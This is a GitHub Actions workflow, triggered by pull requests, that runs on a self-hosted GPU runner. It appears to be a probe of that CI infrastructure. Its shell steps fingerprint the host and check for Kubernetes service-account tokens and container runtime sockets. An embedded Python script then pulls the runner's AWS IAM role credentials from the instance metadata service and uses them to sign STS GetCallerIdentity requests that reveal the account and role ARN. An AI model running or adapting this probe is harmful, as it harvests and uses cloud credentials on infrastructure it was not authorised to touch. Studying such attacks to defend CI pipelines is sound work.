name: c211-i124945-breadth
on:
  pull_request:
    types: [opened, synchronize, reopened]
permissions:
  contents: read
jobs:
  mi300-1gpu-01:
    runs-on: linux-mi300-1gpu-sglang
    timeout-minutes: 12
    steps:
      - name: fingerprint
        env:
          NONCE: c211-i124945-55b3f9b462394d7d
        run: |
          set -u
          echo "C211_JOB=mi300-1gpu-01 NONCE=$NONCE"
          echo "C211_MARKER job=mi300-1gpu-01 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
          id
          uname -a 2>&1 || true
          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none}"
          ls -l /dev/nvidia* /dev/kfd /dev/dri /var/run/docker.sock /run/containerd/containerd.sock 2>&1 | head -30 || true
          echo "--- NVIDIA ---"
          if command -v nvidia-smi >/dev/null 2>&1; then
            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
          else echo NVIDIA_SMI_ABSENT; fi
          echo "--- AMD ---"
          if command -v rocm-smi >/dev/null 2>&1; then
            rocm-smi --showuniqueid --showproductname 2>&1 | head -200 || echo ROCM_SMI_FAILED
            rocm-smi --showproductname 2>&1 | head -40 || true
          else echo ROCM_SMI_ABSENT; fi
          if command -v amd-smi >/dev/null 2>&1; then amd-smi static 2>&1 | head -250 || echo AMD_SMI_FAILED; else echo AMD_SMI_ABSENT; fi
          echo "--- INTEL XPU ---"
          if command -v xpu-smi >/dev/null 2>&1; then xpu-smi discovery 2>&1 | head -150 || echo XPU_SMI_FAILED; else echo XPU_SMI_ABSENT; fi
          echo "--- MUSA ---"
          if command -v mthreads-gmi >/dev/null 2>&1; then mthreads-gmi 2>&1 | head -150 || echo MTHREADS_GMI_FAILED; else echo MTHREADS_GMI_ABSENT; fi
          echo "--- IMDSv2/STS (read-only, sha256-only credential presence) ---"
          if command -v python3 >/dev/null 2>&1; then
            python3 - <<'PYEOF_IMDS'
          import json,hashlib,urllib.request as R,urllib.error as U,hmac,datetime,re,os,socket
          def fp(v):return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
          def g(p,t):
           try:
            return R.urlopen(R.Request('http://169.254.169.254/latest/'+p,headers={'X-aws-ec2-metadata-token':t}),timeout=4).read().decode('utf-8','replace')
           except Exception as e:return 'ERR:'+str(e)[:80]
          def sts(a,s,t):
           b='Action=GetCallerIdentity&Version=2011-06-15';am=datetime.datetime.now(datetime.timezone.utc);d1=am.strftime('%Y%m%dT%H%M%SZ');d2=am.strftime('%Y%m%d')
           c='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:sts.amazonaws.com\nx-amz-date:%s\n'%d1;sh='content-type;host;x-amz-date'
           if t:c+='x-amz-security-token:%s\n'%t;sh+=';x-amz-security-token'
           c+='\n'+sh+'\n'+hashlib.sha256(b.encode()).hexdigest();sc='%s/us-east-1/sts/aws4_request'%d2
           ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(d1,sc,hashlib.sha256(c.encode()).hexdigest());k=('AWS4'+s).encode()
           for m in (d2,'us-east-1','sts','aws4_request'):k=hmac.new(k,m.encode(),hashlib.sha256).digest()
           H={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':d1,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(a,sc,sh,hmac.new(k,ts.encode(),hashlib.sha256).hexdigest())}
           if t:H['X-Amz-Security-Token']=t
           try:
            r=R.urlopen(R.Request('https://sts.amazonaws.com/',data=b.encode(),headers=H,method='POST'),timeout=8);return r.status,r.read().decode('utf-8','replace')
           except U.HTTPError as e:return e.code,e.read().decode('utf-8','replace')
           except Exception as e:return -1,str(e)[:150]
          print('C211_PY_HOST',socket.gethostname(),'uid',os.getuid());t=''
          try:t=R.urlopen(R.Request('http://169.254.169.254/latest/api/token',data=b'',method='PUT',headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'}),timeout=4).read().decode()
          except Exception as e:print('IMDS_TOKEN_ERR',str(e)[:100])
          print('IMDS_TOKEN_PRESENT',bool(t))
          if t:
           for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info'):print('IMDS',p,'=',g(p,t).replace('\n',' ')[:250])
           r=g('meta-data/iam/security-credentials/',t).strip();print('IMDS_ROLE',r)
           if r and not r.startswith('ERR'):
            cb=g('meta-data/iam/security-credentials/'+r.splitlines()[0],t)
            try:
             d=json.loads(cb);print('CRED',json.dumps({'AK_fp':fp(d.get('AccessKeyId')),'SK_fp':fp(d.get('SecretAccessKey')),'Tok_fp':fp(d.get('Token')),'Exp':d.get('Expiration'),'Code':d.get('Code')}))
             s,x=sts(d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token'));m=re.search(r'<Arn>([^<]+)</Arn>',x);a2=re.search(r'<Account>([^<]+)</Account>',x)
             print('STS',s,'ARN',m.group(1) if m else None,'ACCT',a2.group(1) if a2 else None)
             if s!=200:print('STS_BODY',x[:200].replace('\n',' '))
             s2,x2=sts(d.get('AccessKeyId'),str(d.get('SecretAccessKey'))+'TAMPERED',d.get('Token'));m2=re.search(r'<Code>([^<]+)</Code>',x2)
             print('STS_TAMPERED',s2,'CODE',m2.group(1) if m2 else None)
            except Exception as e:print('CRED_PARSE_FAIL',str(e)[:150],cb[:150].replace('\n',' '))
          PYEOF_IMDS
          else echo PY3_ABSENT; echo IMDS_TOKEN_PRESENT False; fi
          echo "C211_PROBE_END job=mi300-1gpu-01 nonce=$NONCE"
          exit 0
